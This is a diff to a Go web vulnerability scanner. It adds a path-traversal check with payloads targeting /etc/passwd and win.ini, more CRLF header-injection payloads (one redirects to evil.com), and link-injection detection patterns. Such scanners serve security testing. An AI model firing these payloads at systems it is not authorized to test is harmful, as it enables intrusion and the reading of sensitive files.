@@ -27,7 +27,6 @@ var (
 	concurrency    int
 	headers        customheaders
 	proxy          string
-	htmlOnly       bool
 	onlyPOC        bool
 	userAgent      string
 	timeoutSec     int
@@ -46,60 +45,40 @@ const (
 )
 
 const (
-	VULN_XSS_REFLECTED = 1
-	VULN_XSS_SCRIPT    = 2
-	VULN_CRLF          = 3
-	VULN_REDIRECT      = 4
-	VULN_LINK_MANIP    = 5
-	VULN_SSTI          = 6
+	VULN_XSS_REFLECTED  = 1
+	VULN_XSS_SCRIPT     = 2
+	VULN_CRLF           = 3
+	VULN_REDIRECT       = 4
+	VULN_LINK_MANIP     = 5
+	VULN_SSTI           = 6
+	VULN_PATH_TRAVERSAL = 7
 )
 
 var defaultFuzzParams = []string{
-	// Busca e filtro
 	"q", "search", "query", "s", "keyword", "keywords", "term", "terms",
 	"filter", "filters", "where", "condition", "criteria",
-	
-	// Paginação
 	"page", "p", "offset", "limit", "per_page", "perpage", "size",
 	"start", "end", "from", "to", "since", "until",
-	
-	// Ordenação
 	"sort", "order", "sort_by", "order_by", "dir", "direction",
 	"sort_order", "sort_dir",
-	
-	// Identificadores
 	"id", "ids", "uid", "uuid", "guid", "code", "key", "token",
 	"hash", "ref", "reference", "redirect", "return", "return_to",
 	"next", "prev", "back", "callback", "call", "jsonp", "format",
 	"output", "view", "template", "partial", "layout",
-	
-	// Usuário
+	"file", "filename", "path", "dir", "directory", "folder",
+	"download", "upload", "image", "img", "photo", "picture",
 	"user", "username", "login", "email", "mail", "name", "fullname",
 	"firstname", "lastname", "nick", "nickname", "role", "group",
 	"session", "sessid", "session_id", "auth", "api_key", "apikey",
 	"api_token", "access_token",
-	
-	// Ações
 	"action", "method", "op", "operation", "cmd", "command",
 	"func", "function", "do", "run", "execute", "process",
-	
-	// Dados
 	"data", "json", "xml", "body", "content", "text", "message",
 	"comment", "feedback", "review", "rating", "score",
-	
-	// Arquivos
-	"file", "filename", "path", "dir", "directory", "folder",
-	"download", "upload", "image", "img", "photo", "picture",
-	
-	// API
 	"version", "v", "api", "endpoint", "resource", "service",
 	"webhook", "notify", "alert",
-	
-	// Configuração
 	"lang", "language", "locale", "timezone", "tz", "zone",
 	"theme", "skin", "mode", "debug", "test",
-	
-	// Segurança
 	"csrf", "csrf_token", "xsrf", "xsrf_token", "nonce",
 	"signature", "sign", "hmac", "checksum", "fingerprint",
 }
@@ -109,13 +88,12 @@ func init() {
 	flag.Var(&headers, "H", "Header extra")
 	flag.StringVar(&proxy, "proxy", "", "Proxy HTTP")
 	flag.StringVar(&proxy, "x", "", "Proxy HTTP")
-	flag.BoolVar(&htmlOnly, "html", false, "Só reportar se Content-Type for text/html")
 	flag.BoolVar(&onlyPOC, "s", false, "Somente PoC (esconde Not Vulnerable)")
 	flag.StringVar(&userAgent, "ua", "efx-scanner/3.0", "User-Agent")
 	flag.IntVar(&timeoutSec, "timeout", 8, "Timeout")
 	flag.IntVar(&paramCount, "params", 70, "Parâmetros por endpoint (0=todos)")
 	flag.IntVar(&mode, "mode", 0, "Modo de extração")
-	flag.StringVar(&vulnTypes, "vulns", "1,2,3,4,5,6", "Tipos de vulnerabilidade")
+	flag.StringVar(&vulnTypes, "vulns", "1,2,3,4,5,6,7", "Tipos de vulnerabilidade")
 	flag.StringVar(&payload, "p", "FUZZ", "Payload")
 	flag.IntVar(&requestsPerSec, "rps", 0, "Requests por segundo")
 	flag.IntVar(&maxIdleConns, "max-idle", 100, "Conexões idle")
@@ -208,12 +186,171 @@ func applyHeaders(req *http.Request) {
 	if userAgent != "" {
 		req.Header.Set("User-Agent", userAgent)
 	}
-	for _, h := range headers {
-		parts := strings.SplitN(h, ":", 2)
+	// Usando range com string corretamente
+	for idx := 0; idx < len(headers); idx++ {
+		headerLine := headers[idx]
+		parts := strings.SplitN(headerLine, ":", 2)
 		if len(parts) == 2 {
-			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
+			headerName := strings.TrimSpace(parts[0])
+			headerValue := strings.TrimSpace(parts[1])
+			req.Header.Set(headerName, headerValue)
 		}
 	}
+}
+
+func fetchFullResponse(method, fullURL, body string) (headersResp string, bodyContent string, contentType string, err error) {
+	rateLimiter.Wait()
+
+	u, err := url.Parse(fullURL)
+	if err != nil {
+		return "", "", "", err
+	}
+
+	host := u.Host
+	if !strings.Contains(host, ":") {
+		if u.Scheme == "https" {
+			host += ":443"
+		} else {
+			host += ":80"
+		}
+	}
+
+	dialTimeout := time.Duration(timeoutSec) * time.Second
+
+	readFull := func(c net.Conn, reqTarget string, tlsWrap bool) (string, string, string, error) {
+		if tlsWrap {
+			sn := u.Hostname()
+			tconn := tls.Client(c, &tls.Config{ServerName: sn, InsecureSkipVerify: true})
+			if err := tconn.Handshake(); err != nil {
+				return "", "", "", err
+			}
+			c = tconn
+		}
+		if reqTarget == "" {
+			reqTarget = u.RequestURI()
+		}
+		reqLine := method + " " + reqTarget + " HTTP/1.1\r\n"
+		var reqBuilder strings.Builder
+		reqBuilder.WriteString(reqLine)
+		reqBuilder.WriteString("Host: " + u.Host + "\r\n")
+		reqBuilder.WriteString("Connection: close\r\n")
+		if userAgent != "" {
+			reqBuilder.WriteString("User-Agent: " + userAgent + "\r\n")
+		}
+		for idx := 0; idx < len(headers); idx++ {
+			h := headers[idx]
+			parts := strings.SplitN(h, ":", 2)
+			if len(parts) == 2 {
+				reqBuilder.WriteString(strings.TrimSpace(parts[0]) + ": " + strings.TrimSpace(parts[1]) + "\r\n")
+			}
+		}
+		if method == "POST" && body != "" {
+			reqBuilder.WriteString("Content-Type: application/x-www-form-urlencoded\r\n")
+			reqBuilder.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
+		}
+		reqBuilder.WriteString("\r\n")
+		if method == "POST" && body != "" {
+			reqBuilder.WriteString(body)
+		}
+
+		c.SetDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))
+		if _, err := c.Write([]byte(reqBuilder.String())); err != nil {
+			return "", "", "", err
+		}
+
+		rd := bufio.NewReader(c)
+		var headerBuilder strings.Builder
+		contentType = ""
+
+		for {
+			line, err := rd.ReadString('\n')
+			if err != nil {
+				return "", "", "", err
+			}
+			headerBuilder.WriteString(line)
+
+			if strings.HasPrefix(strings.ToLower(line), "content-type:") {
+				contentType = strings.TrimSpace(strings.TrimPrefix(strings.ToLower(line), "content-type:"))
+			}
+
+			if line == "\r\n" || line == "\n" {
+				break
+			}
+			if headerBuilder.Len() > 64*1024 {
+				break
+			}
+		}
+
+		bodyReader := io.LimitReader(rd, maxBodySize)
+		bodyBytes, err := io.ReadAll(bodyReader)
+		if err != nil {
+			return headerBuilder.String(), "", contentType, err
+		}
+
+		return headerBuilder.String(), string(bodyBytes), contentType, nil
+	}
+
+	if proxy == "" {
+		c, err := net.DialTimeout("tcp", host, dialTimeout)
+		if err != nil {
+			return "", "", "", err
+		}
+		defer c.Close()
+		needTLS := (u.Scheme == "https")
+		return readFull(c, "", needTLS)
+	}
+
+	pURL, err := url.Parse(proxy)
+	if err != nil {
+		return "", "", "", err
+	}
+	if pURL.Scheme != "http" {
+		return "", "", "", fmt.Errorf("proxy scheme not supported")
+	}
+	proxyHost := pURL.Host
+	if !strings.Contains(proxyHost, ":") {
+		proxyHost += ":80"
+	}
+	c, err := net.DialTimeout("tcp", proxyHost, dialTimeout)
+	if err != nil {
+		return "", "", "", err
+	}
+	defer c.Close()
+
+	if u.Scheme == "http" {
+		return readFull(c, u.String(), false)
+	}
+
+	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", host, u.Host)
+	c.SetDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))
+	if _, err := c.Write([]byte(connectReq)); err != nil {
+		return "", "", "", err
+	}
+	br := bufio.NewReader(c)
+	var respHead strings.Builder
+	for {
+		line, err := br.ReadString('\n')
+		if err != nil {
+			return "", "", "", err
+		}
+		respHead.WriteString(line)
+		if strings.Contains(respHead.String(), "\r\n\r\n") {
+			break
+		}
+		if respHead.Len() > 32*1024 {
+			break
+		}
+	}
+	if !strings.Contains(strings.ToLower(respHead.String()), " 200 ") {
+		return "", "", "", fmt.Errorf("proxy CONNECT failed")
+	}
+	return readFull(c, "", true)
+}
+
+func isHTMLResponse(contentType string) bool {
+	contentType = strings.ToLower(contentType)
+	return strings.Contains(contentType, "text/html") ||
+		strings.Contains(contentType, "application/xhtml+xml")
 }
 
 func fetchBody(rawURL string) (string, error) {
@@ -236,140 +373,6 @@ func fetchBody(rawURL string) (string, error) {
 
 	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
 	return string(body), err
-}
-
-func fetchRawResponseHead(method, fullURL, body string) (string, error) {
-	rateLimiter.Wait()
-
-	u, err := url.Parse(fullURL)
-	if err != nil {
-		return "", err
-	}
-
-	host := u.Host
-	if !strings.Contains(host, ":") {
-		if u.Scheme == "https" {
-			host += ":443"
-		} else {
-			host += ":80"
-		}
-	}
-
-	dialTimeout := time.Duration(timeoutSec) * time.Second
-
-	readHead := func(c net.Conn, reqTarget string, tlsWrap bool) (string, error) {
-		if tlsWrap {
-			sn := u.Hostname()
-			tconn := tls.Client(c, &tls.Config{ServerName: sn, InsecureSkipVerify: true})
-			if err := tconn.Handshake(); err != nil {
-				return "", err
-			}
-			c = tconn
-		}
-		if reqTarget == "" {
-			reqTarget = u.RequestURI()
-		}
-		reqLine := method + " " + reqTarget + " HTTP/1.1\r\n"
-		var b strings.Builder
-		b.WriteString(reqLine)
-		b.WriteString("Host: " + u.Host + "\r\n")
-		b.WriteString("Connection: close\r\n")
-		if userAgent != "" {
-			b.WriteString("User-Agent: " + userAgent + "\r\n")
-		}
-		for _, h := range headers {
-			parts := strings.SplitN(h, ":", 2)
-			if len(parts) == 2 {
-				b.WriteString(strings.TrimSpace(parts[0]) + ": " + strings.TrimSpace(parts[1]) + "\r\n")
-			}
-		}
-		if method == "POST" && body != "" {
-			b.WriteString("Content-Type: application/x-www-form-urlencoded\r\n")
-			b.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
-		}
-		b.WriteString("\r\n")
-		if method == "POST" && body != "" {
-			b.WriteString(body)
-		}
-
-		c.SetDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))
-		if _, err := c.Write([]byte(b.String())); err != nil {
-			return "", err
-		}
-
-		rd := bufio.NewReader(c)
-		var head strings.Builder
-		for {
-			line, err := rd.ReadString('\n')
-			if err != nil {
-				return "", err
-			}
-			head.WriteString(line)
-			if strings.Contains(head.String(), "\r\n\r\n") {
-				break
-			}
-			if head.Len() > 64*1024 {
-				break
-			}
-		}
-		return strings.TrimSuffix(head.String(), "\r\n\r\n"), nil
-	}
-
-	if proxy == "" {
-		c, err := net.DialTimeout("tcp", host, dialTimeout)
-		if err != nil {
-			return "", err
-		}
-		defer c.Close()
-		needTLS := (u.Scheme == "https")
-		return readHead(c, "", needTLS)
-	}
-
-	pURL, err := url.Parse(proxy)
-	if err != nil {
-		return "", err
-	}
-	if pURL.Scheme != "http" {
-		return "", fmt.Errorf("proxy scheme not supported")
-	}
-	proxyHost := pURL.Host
-	if !strings.Contains(proxyHost, ":") {
-		proxyHost += ":80"
-	}
-	c, err := net.DialTimeout("tcp", proxyHost, dialTimeout)
-	if err != nil {
-		return "", err
-	}
-	defer c.Close()
-
-	if u.Scheme == "http" {
-		return readHead(c, u.String(), false)
-	}
-
-	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", host, u.Host)
-	c.SetDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))
-	if _, err := c.Write([]byte(connectReq)); err != nil {
-		return "", err
-	}
-	br := bufio.NewReader(c)
-	var respHead strings.Builder
-	for {
-		line, err := br.ReadString('\n')
-		if err != nil {
-			return "", err
-		}
-		respHead.WriteString(line)
-		if strings.Contains(respHead.String(), "\r\n\r\n") {
-			break
-		}
-		if respHead.Len() > 32*1024 {
-			break
-		}
-	}
-	if !strings.Contains(strings.ToLower(respHead.String()), " 200 ") {
-		return "", fmt.Errorf("proxy CONNECT failed")
-	}
-	return readHead(c, "", true)
 }
 
 var (
@@ -519,13 +522,17 @@ func testXSSReflected(baseURL string, params []string) []string {
 			continue
 		}
 
-		body, err := fetchBody(testURL)
+		_, body, contentType, err := fetchFullResponse("GET", testURL, "")
 		if err != nil {
 			continue
 		}
 
+		if !isHTMLResponse(contentType) {
+			continue
+		}
+
 		if strings.Contains(body, rawPayload) {
-			results = append(results, formatVuln("XSS-Reflected", "GET", testURL, fmt.Sprintf("match: %s", rawPayload)))
+			results = append(results, formatVuln("XSS-Reflected", "GET", testURL, fmt.Sprintf("match: %s (Content-Type: %s)", rawPayload, contentType)))
 			return results
 		}
 	}
@@ -553,13 +560,17 @@ func testXSSScript(baseURL string, params []string) []string {
 			continue
 		}
 
-		body, err := fetchBody(testURL)
+		_, body, contentType, err := fetchFullResponse("GET", testURL, "")
 		if err != nil {
 			continue
 		}
 
+		if !isHTMLResponse(contentType) {
+			continue
+		}
+
 		if strings.Contains(body, rawPayload) {
-			results = append(results, formatVuln("XSS-Script", "GET", testURL, fmt.Sprintf("match: %s", rawPayload)))
+			results = append(results, formatVuln("XSS-Script", "GET", testURL, fmt.Sprintf("match: %s (Content-Type: %s)", rawPayload, contentType)))
 			return results
 		}
 	}
@@ -578,19 +589,39 @@ func testXSSScript(baseURL string, params []string) []string {
 
 func testCRLF(baseURL string, params []string) []string {
 	var results []string
-	rawPayload := "\r\nset-cookie:efx\r\n"
-	encodedPayload := url.QueryEscape(rawPayload)
+	crlfPayloads := []string{
+		"\r\nInjected-Header: efx\r\n\r\n",
+		"\r\nSet-Cookie: injected=efx\r\n",
+		"%0d%0aSet-Cookie:%20injected=efx%0d%0a",
+		"\r\nX-Injected: efx\r\n",
+		"\r\nLocation: https://evil.com\r\n",
+	}
 
-	for _, cluster := range chunkSlice(params, clusterSize) {
-		testURL := montarURLRaw(baseURL, cluster, encodedPayload)
-		if testURL == "" {
-			continue
-		}
+	for _, rawPayload := range crlfPayloads {
+		encodedPayload := url.QueryEscape(rawPayload)
 
-		rawHead, err := fetchRawResponseHead("GET", testURL, "")
-		if err == nil && strings.Contains(strings.ToLower(rawHead), "set-cookie: efx") {
-			results = append(results, formatVuln("CRLF-Injection", "GET", testURL, "raw-header injection"))
-			return results
+		for _, cluster := range chunkSlice(params, clusterSize) {
+			testURL := montarURLRaw(baseURL, cluster, encodedPayload)
+			if testURL == "" {
+				continue
+			}
+
+			headersResp, _, _, err := fetchFullResponse("GET", testURL, "")
+			if err != nil {
+				continue
+			}
+
+			headersLower := strings.ToLower(headersResp)
+
+			if strings.Contains(headersLower, "injected-header: efx") ||
+				strings.Contains(headersLower, "set-cookie: injected=efx") ||
+				strings.Contains(headersLower, "x-injected: efx") ||
+				strings.Contains(headersLower, "location: https://evil.com") ||
+				strings.Contains(headersLower, "set-cookie: efx") {
+				results = append(results, formatVuln("CRLF-Injection", "GET", testURL,
+					fmt.Sprintf("header injection detected with payload: %q", rawPayload)))
+				return results
+			}
 		}
 	}
 
@@ -599,7 +630,7 @@ func testCRLF(baseURL string, params []string) []string {
 		if len(exampleParams) > 10 {
 			exampleParams = exampleParams[:10]
 		}
-		exampleURL := montarURLRaw(baseURL, exampleParams, encodedPayload)
+		exampleURL := montarURLRaw(baseURL, exampleParams, url.QueryEscape(crlfPayloads[0]))
 		results = append(results, formatNotVuln("CRLF-Injection", "GET", exampleURL))
 	}
 
@@ -642,26 +673,32 @@ func testRedirect(baseURL string, params []string) []string {
 
 func testLinkManip(baseURL string, params []string) []string {
 	var results []string
-	rawPayload := `https://efxtech.com`
-	encodedPayload := url.QueryEscape(rawPayload)
 
-	for _, cluster := range chunkSlice(params, clusterSize) {
-		testURL := montarURLRaw(baseURL, cluster, encodedPayload)
-		if testURL == "" {
-			continue
-		}
+	payloads := []string{
+		"https://efxtech.com",
+		"//efxtech.com",
+		"efxtech.com",
+	}
 
-		body, err := fetchBody(testURL)
-		if err != nil {
-			continue
-		}
-		bodyLower := strings.ToLower(body)
+	for _, currentPayload := range payloads {
+		encodedPayload := url.QueryEscape(currentPayload)
 
-		if strings.Contains(bodyLower, `href="https://efxtech.com`) ||
-			strings.Contains(bodyLower, `src="https://efxtech.com`) ||
-			strings.Contains(bodyLower, `action="https://efxtech.com`) {
-			results = append(results, formatVuln("Link-Manipulation", "GET", testURL, "injected link in href/src/action"))
-			return results
+		for _, cluster := range chunkSlice(params, clusterSize) {
+			testURL := montarURLRaw(baseURL, cluster, encodedPayload)
+			if testURL == "" {
+				continue
+			}
+
+			body, err := fetchBody(testURL)
+			if err != nil {
+				continue
+			}
+
+			if detectLinkInjection(body, currentPayload) {
+				results = append(results, formatVuln("Link-Manipulation", "GET", testURL,
+					fmt.Sprintf("injection detected with payload: %s", currentPayload)))
+				return results
+			}
 		}
 	}
 
@@ -670,11 +707,66 @@ func testLinkManip(baseURL string, params []string) []string {
 		if len(exampleParams) > 10 {
 			exampleParams = exampleParams[:10]
 		}
-		exampleURL := montarURLRaw(baseURL, exampleParams, encodedPayload)
+		exampleURL := montarURLRaw(baseURL, exampleParams, url.QueryEscape(payloads[0]))
 		results = append(results, formatNotVuln("Link-Manipulation", "GET", exampleURL))
 	}
 
 	return results
+}
+
+func detectLinkInjection(body, payload string) bool {
+	bodyLower := strings.ToLower(body)
+	payloadLower := strings.ToLower(payload)
+
+	patterns := []string{
+		fmt.Sprintf(`src="%s`, payload),
+		fmt.Sprintf(`href="%s`, payload),
+		fmt.Sprintf(`action="%s`, payload),
+		fmt.Sprintf(`src='%s`, payload),
+		fmt.Sprintf(`href='%s`, payload),
+		fmt.Sprintf(`action='%s`, payload),
+		fmt.Sprintf(`src=%s`, payload),
+		fmt.Sprintf(`href=%s`, payload),
+		fmt.Sprintf(`action=%s`, payload),
+		fmt.Sprintf(`src = "%s`, payload),
+		fmt.Sprintf(`href = "%s`, payload),
+		fmt.Sprintf(`action = "%s`, payload),
+		fmt.Sprintf(`srcdoc="%s`, payload),
+		fmt.Sprintf(`srcdoc='%s`, payload),
+		fmt.Sprintf(`.href = "%s`, payload),
+		fmt.Sprintf(`.src = "%s`, payload),
+		fmt.Sprintf(`location = "%s`, payload),
+		fmt.Sprintf(`location.href = "%s`, payload),
+		fmt.Sprintf(`("%s")`, payload),
+		fmt.Sprintf(`('%s')`, payload),
+		fmt.Sprintf(`("%s",`, payload),
+		fmt.Sprintf(`('%s',`, payload),
+		fmt.Sprintf(`.html = "%s`, payload),
+		fmt.Sprintf(`.html = '%s`, payload),
+	}
+
+	for _, pattern := range patterns {
+		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
+			return true
+		}
+	}
+
+	additionalPatterns := []string{
+		fmt.Sprintf("('href', '%s", payloadLower),
+		fmt.Sprintf("('href', \"%s", payloadLower),
+		fmt.Sprintf(".href = '%s", payloadLower),
+		fmt.Sprintf(".href = \"%s", payloadLower),
+		fmt.Sprintf("location = '%s", payloadLower),
+		fmt.Sprintf("location = \"%s", payloadLower),
+	}
+
+	for _, pattern := range additionalPatterns {
+		if strings.Contains(bodyLower, pattern) {
+			return true
+		}
+	}
+
+	return false
 }
 
 func testSSTI(baseURL string, params []string) []string {
@@ -713,10 +805,76 @@ func testSSTI(baseURL string, params []string) []string {
 	return results
 }
 
+func testPathTraversal(baseURL string, params []string) []string {
+	var results []string
+
+	traversalPayloads := []string{
+		"../../../../etc/passwd",
+		"....//....//....//etc/passwd",
+		"..;/..;/..;/etc/passwd",
+		"..\\..\\..\\windows\\win.ini",
+	}
+
+	for _, rawPayload := range traversalPayloads {
+		encodedPayload := url.QueryEscape(rawPayload)
+
+		for _, cluster := range chunkSlice(params, clusterSize) {
+			testURL := montarURLRaw(baseURL, cluster, encodedPayload)
+			if testURL == "" {
+				continue
+			}
+
+			body, err := fetchBody(testURL)
+			if err != nil {
+				continue
+			}
+
+			if detectPathTraversalSuccess(body, rawPayload) {
+				results = append(results, formatVuln("Path-Traversal", "GET", testURL,
+					fmt.Sprintf("file read successful with payload: %q", rawPayload)))
+				return results
+			}
+		}
+	}
+
+	if len(results) == 0 && !onlyPOC {
+		exampleParams := params
+		if len(exampleParams) > 10 {
+			exampleParams = exampleParams[:10]
+		}
+		exampleURL := montarURLRaw(baseURL, exampleParams, url.QueryEscape(traversalPayloads[0]))
+		results = append(results, formatNotVuln("Path-Traversal", "GET", exampleURL))
+	}
+
+	return results
+}
+
+func detectPathTraversalSuccess(body, payload string) bool {
+	isTraversalPayload := strings.Contains(payload, "../") ||
+		strings.Contains(payload, "..\\") ||
+		strings.Contains(payload, "..;/")
+
+	if !isTraversalPayload {
+		return false
+	}
+
+	bodyLower := strings.ToLower(body)
+
+	if strings.Contains(bodyLower, "root:x:0:0") {
+		return true
+	}
+
+	if strings.Contains(bodyLower, "for 16-bit app support") {
+		return true
+	}
+
+	return false
+}
+
 func parseVulnTypes() map[int]bool {
 	selected := make(map[int]bool)
 	if vulnTypes == "" {
-		for i := 1; i <= 6; i++ {
+		for i := 1; i <= 7; i++ {
 			selected[i] = true
 		}
 		return selected
@@ -726,7 +884,7 @@ func parseVulnTypes() map[int]bool {
 	for _, part := range parts {
 		var num int
 		fmt.Sscanf(strings.TrimSpace(part), "%d", &num)
-		if num >= 1 && num <= 6 {
+		if num >= 1 && num <= 7 {
 			selected[num] = true
 		}
 	}
@@ -812,6 +970,12 @@ func processURL(rawURL string, selectedVulns map[int]bool) {
 			fmt.Println(res)
 		}
 	}
+
+	if selectedVulns[VULN_PATH_TRAVERSAL] {
+		for _, res := range testPathTraversal(rawURL, selectedParams) {
+			fmt.Println(res)
+		}
+	}
 }
 
 func main() {
@@ -846,7 +1010,7 @@ func main() {
 	}
 
 	if len(urls) == 0 {
-		fmt.Fprintf(os.Stderr, "Usage: echo 'http://target.com' | go run scanner.go -vulns 1,2,3\n")
+		fmt.Fprintf(os.Stderr, "Usage: echo 'http://target.com' | go run scanner.go -vulns 1,2,3,4,5,6,7\n")
 		os.Exit(1)
 	}
 
